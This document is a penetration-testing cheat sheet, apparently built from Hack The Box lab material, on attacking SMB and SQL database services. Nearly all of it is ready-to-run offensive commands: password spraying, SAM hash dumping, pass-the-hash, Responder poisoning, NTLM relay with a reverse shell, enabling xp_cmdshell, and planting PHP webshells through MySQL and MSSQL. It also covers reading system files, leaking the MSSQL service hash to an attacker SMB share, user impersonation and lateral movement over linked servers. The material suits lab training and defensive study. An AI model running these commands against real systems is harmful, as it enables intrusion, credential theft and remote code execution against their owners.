# Attacking common services
- [SMB](#smb)
- [SQL Databases](#sql-databases)
    - [SQL Syntax](#sql-syntax)
        - [Basics](#basics)
        - [Execute Commands](#execute-commands)
        - [Write Local Files](#write-local-files)
        - [Read Local Files](#read-local-files)
    - [Capture MSSQL Service Hash](#capture-mssql-service-hash)
    - [Impersonate Existing Users with MSSQL](#impersonate-existing-users-with-mssql)
    - [Communicate with Other Databases with MSSQL](#communicate-with-other-databases-with-mssql)


## SMB

- **Impacket PsExec**
    - To connect to a remote machine with a local administrator account, using impacket-psexec, you can use the following command: `impacket-psexec administrator:'Password123!'@10.10.110.17`

- **CrackMapExec**
    - Password Spraying: `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`
    - Execute Commands: `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
    - Extract Hashes from SAM Database: `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
    - Pass-the-Hash (PtH): `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`


> [!NOTE]
> Using the `--continue-on-success` flag, It will continue spraying even after a valid password is found.
> If we are targeting a non-domain joined computer, we will need to use the option `--local-auth`.

### Forced Authentication Attacks
- We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.
- The most common tool to perform such operations is the Responder. 
- Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes.
- **Steps**
    - Creating a fake SMB server using the Responder default configuration, with the following command: `responder -I <interface name>`
    - Crack it using the hashcat module 5600.
    - If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) or [Responder MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py).
        1. We need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf): `cat /etc/responder/Responder.conf | grep 'SMB ='`
        2. We execute impacket-ntlmrelayx with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`: `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
        3. We can execute commands by adding the option `-c` and get a [reverse shell](https://www.revshells.com/): `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'REV_SHELL'`

- [ ] Check for [SMBGhost](https://www.exploit-db.com/exploits/48537) Vulnerability  

## SQL Databases
- **Connnecting to the MySQL server:**
    - `mysql -u julio -pPassword123 -h 10.129.20.13`
    - `C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30`

- **Connecting to the MSSQL server:**
    - `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`. `-h` to disable headers and footers for a cleaner look.
    - `mssqlclient.py -p 1433 julio@10.129.203.7 `

> [!NOTE]
> When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use SERVERNAME\\accountname or .\\accountname. The full command would look like: `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`


### SQL Syntax
#### Basics
- Show Databases
    - `mysql> SHOW DATABASES;` , 
    - If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax: 
    ```
    1> SELECT name FROM master.dbo.sysdatabases
    2> GO
    ```
- Select a Database
    - `mysql> USE htbusers;`
    - 
    ```
    1> USE htbusers
    2> GO
    ```
- Show Tables
    - `mysql> SHOW TABLES;`
    - 
    ```
    1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
    2> GO
    ```
- Select all Data from Table "users"
    - `mysql> SELECT * FROM users;`
    - 
    ```
    1> SELECT * FROM users
    2> go
    ```

#### Execute Commands
- **XP_CMDSHELL**
    - 
    ```
    1> xp_cmdshell 'whoami'
    2> GO

    output
    -----------------------------
    no service\mssql$sqlexpress
    NULL
    (2 rows affected)
    ```
    - If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
    ```
    -- To allow advanced options to be changed.  
    EXECUTE sp_configure 'show advanced options', 1
    GO

    -- To update the currently configured value for advanced options.  
    RECONFIGURE
    GO  

    -- To enable the feature.  
    EXECUTE sp_configure 'xp_cmdshell', 1
    GO  

    -- To update the currently configured value for this feature.  
    RECONFIGURE
    GO
    ```

> [!TIP]
> There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. 
> `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.

> [!TIP]
> MySQL supports User Defined Functions which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).

#### Write Local Files
- **MySQL**
    - MySQL does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands: `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`

    - In MySQL, a global system variable `secure_file_priv` limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT â€¦ INTO OUTFILE` statements and the `LOAD_FILE()` function. These operations are permitted only to users who have the FILE privilege.

    - secure_file_priv may be set as follows:

        - If empty, the variable has no effect, which is not a secure setting.
        - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
        - If set to NULL, the server disables import and export operations.
    ```
    mysql> show variables like "secure_file_priv";

    ```
- **MSSQL**
    - To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
    ```
    1> sp_configure 'show advanced options', 1
    2> GO
    3> RECONFIGURE
    4> GO
    5> sp_configure 'Ole Automation Procedures', 1
    6> GO
    7> RECONFIGURE
    8> GO
    ```
    - Create a File:
    ```
    1> DECLARE @OLE INT
    2> DECLARE @FileID INT
    3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
    5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
    6> EXECUTE sp_OADestroy @FileID
    7> EXECUTE sp_OADestroy @OLE
    8> GO
    ```

#### Read Local Files
- **MySQL**
    - By default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:`mysql> select LOAD_FILE("/etc/passwd");`
- **MSSQL**
    - 
    ```
    1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    2> GO
    ```

### Capture MSSQL Service Hash
- We can steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system


```
# XP_DIRTREE Hash Stealing
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

# XP_SUBDIRS Hash Stealing
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

# XP_SUBDIRS Hash Stealing with Responder
sudo responder -I tun0

# XP_SUBDIRS Hash Stealing with impacket
sudo impacket-smbserver share ./ -smb2support
```

### Impersonate Existing Users with MSSQL
- SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
- **Steps**
    1. Identify Users that We Can Impersonate
    ```
    1> SELECT distinct b.name
    2> FROM sys.server_permissions a
    3> INNER JOIN sys.server_principals b
    4> ON a.grantor_principal_id = b.principal_id
    5> WHERE a.permission_name = 'IMPERSONATE'
    6> GO
    ```
    2. Verifying our Current User and Role
    ```
    1> SELECT SYSTEM_USER
    2> SELECT IS_SRVROLEMEMBER('sysadmin')
    3> go
    ```
    3. Impersonating a User
    ```
    1> EXECUTE AS LOGIN = 'USER'
    2> SELECT SYSTEM_USER
    3> SELECT IS_SRVROLEMEMBER('sysadmin')
    4> GO
    ```
> [!NOTE]
> It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

> [!TIP]
> If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

### Communicate with Other Databases with MSSQL
- MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
- If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
- **Steps**
    1. Identify linked Servers in MSSQL: 
    ```
    1> SELECT srvname, isremote FROM sysservers
    2> GO
    ```
    2. Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
    ```
    1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
    2> GO
    ```

> [!NOTE]
>  If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).



  
